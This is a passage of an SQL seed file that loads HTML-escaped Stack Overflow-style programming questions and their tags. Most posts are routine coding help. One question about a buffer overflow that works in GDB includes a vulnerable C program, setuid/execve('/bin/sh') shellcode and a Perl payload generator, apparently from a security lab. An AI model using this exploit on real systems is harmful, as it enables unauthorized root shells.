                    echo json_encode(array(&quot;status&quot; =&amp;gt; TRUE));
                }

                public function filiere_delete($id)
                {
                    $this-&amp;gt;filiere_model-&amp;gt;delete_by_id($id);
                    echo json_encode(array(&quot;status&quot; =&amp;gt; TRUE));
                }


            }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Please help!&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (10, 1, 'Send data from more than one form with ajax to the same controller');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (10, 10, 17, 'Create');
INSERT INTO tag (text) VALUES ('jquery');
INSERT INTO questiontag (question_id, tag_id) VALUES (10, 27);
INSERT INTO tag (text) VALUES ('ajax');
INSERT INTO questiontag (question_id, tag_id) VALUES (10, 28);
INSERT INTO tag (text) VALUES ('codeigniter-3');
INSERT INTO questiontag (question_id, tag_id) VALUES (10, 29);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', -1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (11, 46, '&lt;p&gt;Here is my style:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;
      ul {         
          padding:0 0 0 0;
          margin:0 0 0 0;
      }
      ul li {     
          list-style:none;
          margin-bottom:25px;           
      }
      ul li img {
          cursor: pointer;
      }
      .modal-body {
          padding:5px !important;
      }
      .modal-content {
          border-radius:0;
      }
      .modal-dialog img {
          text-align:center;
          margin:0 auto;
      }
    .controls{          
        width:50px;
        display:block;
        font-size:11px;
        padding-top:8px;
        font-weight:bold;          
    }
    .next {
        float:right;
        text-align:right;
    }
      /*override modal for demo only*/
      .modal-dialog {
          max-width:500px;
          padding-top: 90px;
      }
      @media screen and (min-width: 768px){
          .modal-dialog {
              width:500px;
              padding-top: 90px;
          }          
      }
      @media screen and (max-width:1500px){
          #ads {
              display:none;
          }
      }

        .dock {
            border: 4px dotted #cccccc;
            background-color: #ededed;
            width: 600px;
            height: 300px;
            color: #aaa;
            font-size: 18px;
            text-align: center;
            padding-top: 100px;
        }
        .dock_hover {
            border: 4px dotted #4d90fe;
            background-color: #e7f0ff;
            width: 600px;
            height: 300px;
            color: #4d90fe;
            font-size: 18px;
            text-align: center;
            padding-top: 100px;
        }
  &amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And I want to control &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ul li {     
          list-style:none;
          margin-bottom:25px;           
      }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;without making change for my default page. &lt;strong&gt;margin-bottom&lt;/strong&gt; must be 0px
And here is my ul li&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;ul class=&quot;row&quot;&amp;gt;
    &amp;lt;li class=&quot;col-lg-3 col-md-3 &quot;&amp;gt;
    &amp;lt;img class=&quot;img-responsive&quot; src=&quot;images/photodune-174908-rocking-the-night-away-xs.jpg&quot;&amp;gt;
    &amp;lt;/li&amp;gt;
    &amp;lt;li class=&quot;col-lg-3 col-md-3 &quot;&amp;gt;
    &amp;lt;img class=&quot;img-responsive&quot; src=&quot;images/photodune-287182-blah-blah-blah-yellow-road-sign-xs.jpg&quot;&amp;gt;
    &amp;lt;/li&amp;gt;
    &amp;lt;li class=&quot;col-lg-3 col-md-3 &quot;&amp;gt;
    &amp;lt;img class=&quot;img-responsive&quot; src=&quot;images/photodune-460760-colors-xs.jpg&quot;&amp;gt;
    &amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Is it possible to change margin-bottom:0px through given class to ul li ? I&#x27;ve read the reference &lt;a href=&quot;http://stackoverflow.com/questions/5639234/css-style-change-just-for-one-page&quot;&gt;css style change just for one page&lt;/a&gt; but I don&#x27;t know how to implement its code. That&#x27;s why I ask a question for this.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (11, 1, 'How to make css for class in single page?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (11, 11, 46, 'Create');
INSERT INTO tag (text) VALUES ('javascript');
INSERT INTO questiontag (question_id, tag_id) VALUES (11, 30);
INSERT INTO questiontag (question_id, tag_id) VALUES (11, 27);
INSERT INTO tag (text) VALUES ('html');
INSERT INTO questiontag (question_id, tag_id) VALUES (11, 31);
INSERT INTO tag (text) VALUES ('css');
INSERT INTO questiontag (question_id, tag_id) VALUES (11, 32);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (12, 43, '&lt;p&gt;Im new with Python and my function is not working as expected. Im trying to save some values in a list list_alt[i] but if i call the values outside the if or else statements i get only None.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import os.path
import xlrd
import sys
import argparse

def readExcel():
     workbook = xlrd.open_workbook(path)
     sheet = workbook.sheet_by_index(0)
     sheet = workbook.sheet_by_index(0)
     j=0
     for row in range(sheet.nrows):
          j += 1
     rownumber=j
     print (rownumber)

     k=0
     i=0
     list_alt=[None]*j 
     list_neu=[None]*j
     while (i&amp;lt;j-10):
          #get first row values
          temp = sheet.cell_value(k,0).replace(&#x27;www.website.com/&#x27;,&#x27;&#x27;)   
          #get second row values
          temp2 = sheet.cell_value(k,1)
          if &quot;http:&quot; in temp2:
               temp2 = sheet.cell_value(k,1).replace(&#x27;http:&#x27;,&#x27;https:&#x27;)
               list_neu[i]=temp2
               list_alt[i]=temp
               k+=0
               i+=1
          elif &quot;http&quot; not in temp2:
               print (&quot;not there&quot;)
               k+=1
          else:
               list_neu[i]=temp2
               list_alt[i]=temp
               #i can print the values here
               print (list_alt[i])
               print (list_neu[i]) 
               i+=1
               k+=1

          #I cant print for the values here anymore
          print (list_alt[i])
          print (i)

     return list_alt, list_neu
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (12, 1, 'variable in function nor returning values after else statement');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (12, 12, 43, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (12, 22);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (13, 21, '&lt;p&gt;I&#x27;m getting this issue in botframework dashboard.&lt;/p&gt;

&lt;p&gt;I have added google maps as white listed domain.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{
  &quot;setting_type&quot; : &quot;domain_whitelisting&quot;,
  &quot;domain_action_type&quot;: &quot;add&quot;,
  &quot;whitelisted_domains&quot;:[
    &quot;https://www.google.com/maps/place/&quot;
  ]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Full link : &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://www.google.com/maps/place/51%C2%B030&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://www.google.com/maps/place/51%C2%B030&lt;/a&gt;&#x27;40.1%22N+0%C2%B005&#x27;02.0%22W/@51.5111351,-0.0860752,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0x0!8m2!3d51.5111351!4d-0.0838865&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Why it does not render as a white-listed domain ? &lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (13, 1, 'The URL provided is not whitelisted for messenger extensions');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (13, 13, 21, 'Create');
INSERT INTO tag (text) VALUES ('botframework');
INSERT INTO questiontag (question_id, tag_id) VALUES (13, 33);
INSERT INTO tag (text) VALUES ('facebook-messenger');
INSERT INTO questiontag (question_id, tag_id) VALUES (13, 34);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (14, 26, '&lt;p&gt;I cant find a way to implement an onClick event on a button that will allow the application to navigate between the login and the second view.&lt;/p&gt;

&lt;p&gt;How can I do that ?&lt;/p&gt;

&lt;p&gt;Here is what i did&lt;/p&gt;

&lt;p&gt;I created a method in my LoginViewModel.cs file that should redirect me to the second view.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; class LoginViewModel
{
 private async Task SecondView_Click()
        {
            App.Current.MainPage = new NavigationPage(new SecondView());
        }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then I&#x27;ve defined a BindingContext in my Login.cs&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; public partial class Login : ContentPage
    {
        public Login()
        {
            InitializeComponent();
            BindingContext = new LoginViewModel();
        }
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then I define a button in my Login.xaml that has a binded command property&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; &amp;lt;StackLayout
        VerticalOptions=&quot;CenterAndExpand&quot;&amp;gt;
        &amp;lt;Entry StyleId=&quot;UsernameEntry&quot;
               Placeholder=&quot;Username&quot;
               Text=&quot;{Binding Username}&quot; /&amp;gt;
        &amp;lt;Entry StyleId=&quot;PasswordEntry&quot;
               Placeholder=&quot;password&quot;
               Text=&quot;{Binding Password}&quot; /&amp;gt;
        &amp;lt;Button 
            StyleId=&quot;btn_connexion&quot;
            Text=&quot;Connexion&quot;
            Command=&quot;{Binding connexion}&quot; /&amp;gt;
        &amp;lt;Button 
            StyleId=&quot;btn_testSecondView&quot;
            Text=&quot;Test 2nd View&quot;
                Command=&quot;{Binding SecondView_Click}&quot;&amp;gt;&amp;lt;/Button&amp;gt;
    &amp;lt;/StackLayout&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (14, 1, 'Navigate between views in Xamarin (visual studio) PCL project');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (14, 14, 26, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (14, 6);
INSERT INTO tag (text) VALUES ('forms');
INSERT INTO questiontag (question_id, tag_id) VALUES (14, 35);
INSERT INTO tag (text) VALUES ('button');
INSERT INTO questiontag (question_id, tag_id) VALUES (14, 36);
INSERT INTO tag (text) VALUES ('xamarin');
INSERT INTO questiontag (question_id, tag_id) VALUES (14, 37);
INSERT INTO tag (text) VALUES ('onclick');
INSERT INTO questiontag (question_id, tag_id) VALUES (14, 38);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (15, 34, '&lt;p&gt;Hello friends i am creating one android app App lock application in which user can lock the application for that i am using one background service which run in background always. My service is run fine in all device but in some new device like OPPO,Redme Mi and Lenovo Mobile there is one advace feature like user can clean all the running task from the cleaner and because of this advance features when user clean all the task my service also stop and app lock will not work so user need to go in application and manual start the service is there any solution to protect my service from this.
one of app lock have this kind of solution 
&lt;a href=&quot;https://play.google.com/store/apps/details?id=com.domobile.applock&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://play.google.com/store/apps/details?id=com.domobile.applock&lt;/a&gt;
This app service is start after the clean task i also want to do same for my application i tried many solution but not getting any result i my service code is as below &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public class MyAppLockService extends Service {
public static int BuildV = 0;
public static final int NOTIFICATION_ID = 11259186;
private static boolean flag;
public static boolean isLauncher;
public static boolean isRunning;
public static ArrayList&amp;lt;String&amp;gt; locked_list;
public static String pack;
public static Thread th;
String currentHomePackage;
private boolean isRefreshedList;
boolean mAllowDestroy;
BroadcastReceiver mReciever;
private boolean mShowNotification;
UsageStatsManager mUsageStatsManager;
ActivityManager manager;
PowerManager pmanager;
SharedPreferences prefs;
public boolean run;
Timer f6t;
TimerTask tt;

class C02221 extends BroadcastReceiver {
    C02221() {
    }

    public void onReceive(Context context, Intent intent) {

        if (intent.getAction().equals(Utils.ACTION_UPDATE)) {
            MyAppLockService.this.refreshList();
        } else if (intent.getAction().equals(Utils.ACTION_STOP_SELF)) {
            MyAppLockService.this.doStopSelf();
        } else if (intent.getAction().equals(Utils.ACTION_REMOVE_APP)) {
            MyAppLockService.this.removeAppFromLockedList(intent
                    .getStringExtra(&quot;packName&quot;));
        }
    }
}

@SuppressLint(&quot;NewApi&quot;)

class C02232 extends TimerTask {
    C02232() {
    }

    @SuppressLint(&quot;NewApi&quot;)
    public void run() {
        if (Utils.isScreenOn(MyAppLockService.this.pmanager)) {
            MyAppLockService.this.isRefreshedList = false;
            String current = &quot;&quot;;
            try {
                current = Utils.getProcess(
                        MyAppLockService.this.mUsageStatsManager,
                        MyAppLockService.this.getApplicationContext());
            } catch (Exception e) {
                current = &quot;&quot;;
            }
            if (current != null) {
                if (MyAppLockService.flag
                        &amp;amp;&amp;amp; current
                                .equals(MyAppLockService.this.currentHomePackage)) {
                    if (MyAppLockService.this.prefs.getBoolean(
                            &quot;immediately&quot;, true)) {
                        MyAppLockService.locked_list = new DBHelper(
                                MyAppLockService.this
                                        .getApplicationContext())
                                .getApsHasStateTrue();
                    }
                    MyAppLockService.flag = false;
                }
                if (!current
                        .equals(MyAppLockService.this.currentHomePackage)
                        &amp;amp;&amp;amp; MyAppLockService.locked_list.contains(current)) {
                    Intent it;
                    if (MyAppLockService.BuildV &amp;gt;= 23) {
                        long endTime = System.currentTimeMillis();
                        UsageEvents usageEvents = MyAppLockService.this.mUsageStatsManager
                                .queryEvents(endTime - 10000, endTime);
                        Event event = new Event();
                        while (usageEvents.hasNextEvent()) {
                            usageEvents.getNextEvent(event);
                        }
                        if (current.equals(event.getPackageName())
                                &amp;amp;&amp;amp; event.getEventType() == 1) {
                            MyAppLockService.pack = current;
                            if (MyAppLockService.this.prefs.getBoolean(
                                    &quot;isPattern&quot;, false)) {
                                MyAppLockService.this
                                        .confirmPattern(current);
                            } else {
                                it = new Intent(
                                        MyAppLockService.this
                                                .getApplicationContext(),
                                        AppLockActivity.class);
                                it.setFlags(DriveFile.MODE_READ_ONLY);
                                MyAppLockService.this
                                        .getApplicationContext()
                                        .startActivity(it);
                            }
                            MyAppLockService.flag = true;
                            return;
                        }
                        return;
                    }
                    MyAppLockService.pack = current;
                    if (MyAppLockService.this.prefs.getBoolean(&quot;isPattern&quot;,
                            false)) {
                        MyAppLockService.this.confirmPattern(current);
                    } else {
                        it = new Intent(
                                MyAppLockService.this
                                        .getApplicationContext(),
                                AppLockActivity.class);
                        it.setFlags(DriveFile.MODE_READ_ONLY);
                        MyAppLockService.this.getApplicationContext()
                                .startActivity(it);
                    }
                    MyAppLockService.flag = true;
                }
            }
        } else if (!MyAppLockService.this.isRefreshedList) {
            MyAppLockService.this.refreshList();
        }
    }
}

public MyAppLockService() {
    this.run = true;
}

static {
    BuildV = VERSION.SDK_INT;
}

public IBinder onBind(Intent intent) {
    return null;
}

public void onCreate() {




    this.prefs = PreferenceManager
            .getDefaultSharedPreferences(getApplicationContext());
    this.manager = (ActivityManager) getApplicationContext()
            .getSystemService(&quot;activity&quot;);
    this.pmanager = (PowerManager) getApplicationContext()
            .getSystemService(&quot;power&quot;);
    if (BuildV &amp;gt;= 21) {
        this.mUsageStatsManager = (UsageStatsManager) getApplicationContext()
                .getSystemService(&quot;usagestats&quot;);
    }
    startNotification();
    Intent intent = new Intent(&quot;android.intent.action.MAIN&quot;);
    intent.addCategory(&quot;android.intent.category.HOME&quot;);
    this.currentHomePackage = getPackageManager().resolveActivity(intent,
            Cast.MAX_MESSAGE_LENGTH).activityInfo.packageName;
    this.mReciever = new C02221();
    IntentFilter filter = new IntentFilter(Utils.ACTION_UPDATE);
    filter.addAction(Utils.ACTION_STOP_SELF);
    filter.addAction(Utils.ACTION_REMOVE_APP);
    registerReceiver(this.mReciever, filter);
    refreshList();
    this.tt = new C02232();
    this.f6t = new Timer();
    this.f6t.schedule(this.tt, 500, 500);
    super.onCreate();
    Calendar cal = Calendar.getInstance();
    Intent intent12 = new Intent(getBaseContext(),MyAppLockService.class);
    PendingIntent pintent = PendingIntent.getService(getBaseContext(), 0, intent12, 0);
    AlarmManager alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
    alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),5, pintent);
}

public int onStartCommand(Intent intent, int flags, int startId) {
    return super.onStartCommand(intent, START_STICKY_COMPATIBILITY, startId);

}

public void onDestroy() {
    try {
        this.f6t.cancel();
        this.tt.cancel();
    } catch (Exception e) {
        e.printStackTrace();
    }

        Intent intent1 = new Intent(&quot;com.android.techtrainner&quot;);
        intent1.putExtra(&quot;yourvalue&quot;, &quot;torestore&quot;);
        sendBroadcast(intent1);


}



public void refreshList() {
    locked_list = new DBHelper(getApplicationContext())
            .getApsHasStateTrue();
    if (locked_list.size() == 0) {
        doStopSelf();
    }
    this.isRefreshedList = true;
}

@SuppressLint({ &quot;InlinedApi&quot; })
private void startForegroundWithNotification() {
    PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this,
            Calculator_Activity.class), 0);
    String title = getString(R.string.app_name);
    String content = getString(R.string.app_name);
    Builder nb = new Builder(this);
    nb.setSmallIcon(R.drawable.ic_transparent);
    nb.setContentTitle(title);
    nb.setContentText(content);
    nb.setWhen(System.currentTimeMillis());
    nb.setContentIntent(pi);
    nb.setOngoing(true);
    nb.setPriority(0);
    startForeground(NOTIFICATION_ID, nb.build());
}

private void startNotification() {
    startForegroundWithNotification();
    if (!this.mShowNotification) {
        HelperService.removeNotification(this);
    }
}

private void doStopSelf() {
    this.mAllowDestroy = true;
    unregisterReceiver(this.mReciever);
    stopForeground(true);
    stopSelf();
}

private void confirmPattern(String st) {

    Intent pIntent = new Intent(getApplicationContext(),
            ResetActivity.class);
    pIntent.putExtra(&quot;isFromReset&quot;, true);
    PendingIntent pi = PendingIntent.getActivity(getApplicationContext(),
            12345, pIntent, DriveFile.MODE_READ_ONLY);

    Intent intent = new Intent(LockPatternActivity.ACTION_COMPARE_PATTERN, null,
            getApplicationContext(), LockPatternActivity.class);
    intent.putExtra(&quot;packName&quot;, st);
    intent.putExtra(&quot;isStealthMode&quot;, this.prefs.getBoolean(
            AlpSettings.Display.METADATA_STEALTH_MODE, false));
    intent.putExtra(&quot;isFromLock&quot;, true);
    intent.setFlags(DriveFile.MODE_READ_ONLY);
    intent.addFlags(Cast.MAX_MESSAGE_LENGTH);

    intent.putExtra(LockPatternActivity.EXTRA_PENDING_INTENT_FORGOT_PATTERN, pi);

    startActivity(intent);

}

private void removeAppFromLockedList(String packName) {
    locked_list.remove(packName);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;if there is any solution for it then please help me out thanks in advance &lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (15, 1, 'how to save or prevent my background service from the force stop or clear task from user');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (15, 15, 34, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (15, 25);
INSERT INTO tag (text) VALUES ('android');
INSERT INTO questiontag (question_id, tag_id) VALUES (15, 39);
INSERT INTO tag (text) VALUES ('eclipse');
INSERT INTO questiontag (question_id, tag_id) VALUES (15, 40);
INSERT INTO tag (text) VALUES ('android-studio');
INSERT INTO questiontag (question_id, tag_id) VALUES (15, 41);
INSERT INTO tag (text) VALUES ('service');
INSERT INTO questiontag (question_id, tag_id) VALUES (15, 42);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (16, 8, '&lt;p&gt;There is a requirement for defining Avro Schema for Map of Map of Map of Map (4 level nested map) in my application. I am using keys at every level except the last map (final inner map). I would like to know what are the pros and cons of the schema. Is there any problem with performance?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (16, 1, 'How to avoid Map of Map of Map of Map in Avro schema');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (16, 16, 8, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (16, 25);
INSERT INTO tag (text) VALUES ('hadoop');
INSERT INTO questiontag (question_id, tag_id) VALUES (16, 43);
INSERT INTO tag (text) VALUES ('bigdata');
INSERT INTO questiontag (question_id, tag_id) VALUES (16, 44);
INSERT INTO tag (text) VALUES ('avro');
INSERT INTO questiontag (question_id, tag_id) VALUES (16, 45);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (17, 9, '&lt;p&gt;I&#x27;m wondering if there is any available solution for disabling browsers restore last session functionality using a programmatic approach? I saw a similar question but the thread had already stopped and no answer had been given.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (17, 1, 'Programmatically disable browsers restore last session functionality');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (17, 17, 9, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (17, 30);
INSERT INTO questiontag (question_id, tag_id) VALUES (17, 25);
INSERT INTO questiontag (question_id, tag_id) VALUES (17, 27);
INSERT INTO tag (text) VALUES ('browser');
INSERT INTO questiontag (question_id, tag_id) VALUES (17, 46);
INSERT INTO tag (text) VALUES ('jboss');
INSERT INTO questiontag (question_id, tag_id) VALUES (17, 47);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (18, 8, '&lt;p&gt;I am trying to get only these metafields objects with namespace=&quot;global&quot;, how can I do that in PHP ?&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php $response = {&quot;metafields&quot;:[{&quot;id&quot;:30007223558,&quot;namespace&quot;:&quot;global&quot;}, {&quot;id&quot;:454872458451,&quot;namespace&quot;:&quot;local&quot;}, {&quot;id&quot;:154644565,&quot;namespace&quot;:&quot;global&quot;}]} ?&amp;gt;
&amp;lt;?php $response = json_decode($response); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (18, 1, 'PHP get object with specific key value');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (18, 18, 8, 'Create');
INSERT INTO tag (text) VALUES ('php');
INSERT INTO questiontag (question_id, tag_id) VALUES (18, 48);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (19, 11, '&lt;p&gt;Is it possible to listen for a value change when the app is not opened at all, and then if there is a value changed in the tree/branch of the Firebase reference, then send the user a notification? That way I can say to the user their is a new message? Thoughts anyone? and would I put the following method&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ref.observe(.value, with: { snapshot in
print(snapshot.value)
})
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;in the didFinishLaunchingWithOptions method in the AppDelagate Class?&lt;/p&gt;

&lt;p&gt;Thanks.&lt;/p&gt;

&lt;p&gt;C&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (19, 1, 'Can you listen for a value change in Firebase in AppDelgate class? Swift');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (19, 19, 11, 'Create');
INSERT INTO tag (text) VALUES ('firebase');
INSERT INTO questiontag (question_id, tag_id) VALUES (19, 49);
INSERT INTO tag (text) VALUES ('push-notification');
INSERT INTO questiontag (question_id, tag_id) VALUES (19, 50);
INSERT INTO tag (text) VALUES ('appdelegate');
INSERT INTO questiontag (question_id, tag_id) VALUES (19, 51);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (20, 41, '&lt;p&gt;I know this has been asked before but i cant get is so if you could please explain in it a bit more it would be appreciated&lt;/p&gt;

&lt;p&gt;So when i run my program on gdb it works perfectly.When i run it just by itself it gets segfault.From what i read i understand that something changed my padding on the gdb just by a little.How can i fix that since i cannot look into my values when im running the program?&lt;/p&gt;

&lt;p&gt;Here is my vunl program&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int bof(char *str){
    char buffer[48];
    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}


int main(int argc, char **argv){
    char str[517];
    FILE *badfile;
    badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf(&quot;Returned Properly\n&quot;);
    return 1;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is my nasm file :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;section .text

global _start

_start:
;clear out the registers we are going to need
xor rax, rax
xor rsi, rsi
xor rdi, rdi
xor rdx, rdx
;setuid0
mov al,105
syscall
;execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) 
xor rax, rax
push rax
;&quot;/bin//sh&quot;=  2f 62 69 6e 2f 2f 73 68
push 0x6e69622f
mov dword [rsp+4], 0x68732f2f
mov rdi, rsp
push rax
mov rdx, rsp
push rdi
mov rsi, rsp
mov al, 59
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And here is my payload that generates the badfile:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/perl

print&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;;

print &quot;\x48\x31\xc0\x48\x31\xf6\x48\x31\xff\x48\x31\xd2\xb0\x69\x0f\x05\x48\x31\xc0\x50\x68\x2f\x62\x69\x6e\xc7\x44\x24\x04\x2f\x2f\x73\x68\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;;
print &quot;\xc0\xda\xff\xff\xff\x7f&quot;;
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (20, 1, 'Buffer overflow works at in GDB but not in Terminal');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (20, 20, 41, 'Create');
INSERT INTO tag (text) VALUES ('c');
INSERT INTO questiontag (question_id, tag_id) VALUES (20, 52);
INSERT INTO tag (text) VALUES ('gdb');
INSERT INTO questiontag (question_id, tag_id) VALUES (20, 53);
INSERT INTO tag (text) VALUES ('buffer-overflow');
INSERT INTO questiontag (question_id, tag_id) VALUES (20, 54);
INSERT INTO tag (text) VALUES ('shellcode');
INSERT INTO questiontag (question_id, tag_id) VALUES (20, 55);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (21, 8, '&lt;p&gt;I have a json array:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[{&quot;value&quot;: &quot;1&quot;},{&quot;value&quot;: &quot;2&quot;},{&quot;value&quot;: &quot;3&quot;},{&quot;value&quot;: &quot;4&quot;},{&quot;value&quot;: &quot;5&quot;},{&quot;value&quot;: &quot;6&quot;}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My code is :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$.ajax({
    url: &quot;120.58.243.11:8080/needCal/myJson.json&quot;, 
    dataType: &#x27;json&#x27;,
    success: function(data) {
        var items = [];
        $.each(data, function(key, value) {
            items.push(&quot;&amp;lt;tr&amp;gt;&quot;);
            items.push(&quot;&amp;lt;td id=&#x27;&#x27;&quot; + key + &quot;&#x27;&#x27;&amp;gt;&quot; + value.value+ &amp;lt; /td&amp;gt;&quot;);
            items.push(&quot;&amp;lt;td id=&#x27;&#x27;&quot; + key + &quot;&#x27;&#x27;&amp;gt;&quot; + total of values + &amp;lt; /td&amp;gt;&quot;); 
            items.push(&quot;&amp;lt;/tr&amp;gt;&quot;);
        });
    }
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I want to calculate the values, how to do with that?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (21, 1, 'Caculate the json&#39;s value then show in html');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (21, 21, 8, 'Create');
INSERT INTO tag (text) VALUES ('json');
INSERT INTO questiontag (question_id, tag_id) VALUES (21, 56);
INSERT INTO questiontag (question_id, tag_id) VALUES (21, 28);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (22, 25, '&lt;p&gt;I am trying to decompile a file using Storyyeller/Krakatau decompiler. I have already downloaded the relevant file and placed it inside a folder. I tried decompile the file using below syntax using command prompt.&lt;/p&gt;

&lt;p&gt;=== Decompilation ===&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;python Krakatau\decompile.py [-nauto] [-path PATH] [-out OUT] [-r] [-skip]
target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;PATH:&lt;/strong&gt; An optional list of directories, jars, or zipfiles to search for
    classes in. Krakatau will attempt to automatically detect and add the
    jar containing core language classes, but you can disable this with
    the &lt;code&gt;-nauto&lt;/code&gt; option. For multiple jars, you can either pass a semicolon
    seperated list of jars or pass the &lt;code&gt;-path&lt;/code&gt; option multiple times.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;OUT:&lt;/strong&gt; Directory name where source files are to be written. Defaults to the
    current directory. If the name ends in .zip or .jar, the output will be a
    zip file instead.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;-r:&lt;/strong&gt; Decompiles all .class files found in the directory target (recursively)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;-skip:&lt;/strong&gt; Continue upon errors. If an error occurs while decompiling a specific
    method, the trace back will be printed as comments in the source file. If the
    error occurs while decompiling at the class level, no source file will be
    emitted and an error message will be printed to the console.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;target:&lt;/strong&gt; Class name or jar name to decompile. If a jar is specified, all
